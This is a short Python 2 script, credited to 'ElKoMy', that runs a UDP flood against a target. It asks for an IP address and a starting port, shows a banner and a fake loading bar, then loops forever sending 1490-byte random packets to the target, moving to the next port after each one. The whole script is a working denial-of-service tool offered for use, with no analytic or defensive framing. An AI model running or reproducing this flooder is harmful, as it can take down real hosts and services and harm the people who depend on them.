import sys #------> System Modules   
#		    ^
import os #   ______|
import time
#Color Module
from termcolor import colored
import socket
import random
#Restart Program
def re():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
try:
         from termcolor import colored
except:
          os.system('pip2 install termcolor')
# tany
try:
	os.system("figlet -f slant ElKoMy")
	print ("""  Keep Going!!"
	\t[*] Coded by ElKoMy
	\t[*]Email : gasser@elkomyy.cf
	""")
	ip = raw_input("IP : ")
	port = input("Port : ")
	os.system("clear")
	os.system("figlet Start")
	os.system("clear")
	os.system("sl")
	# Loading
	print "[                    ] 0% "
	time.sleep(0.1)
	os.system("clear")
	print "[=====               ] 25%"
	time.sleep(0.3)
	os.system("clear")
	print "[==========          ] 50%"
	time.sleep(0.5)
	os.system("clear")
	print "[===============     ] 75%"
	time.sleep(0.2)
	os.system("clear")
	print "[====================] 100%"
	time.sleep(1)
	sent = 0
	# Send Backets
	while True:
	     sock.sendto(bytes, (ip,port))
	     sent = sent + 1
	     port = port + 1
	     print "Sent %s cut to %s and cut port:%s"%(sent,ip,port)
except KeyboardInterrupt:
	print("\n Good Bye ^_^")
	sys.exit()
except:
	print("Error")
	time.sleep(2)
	re()
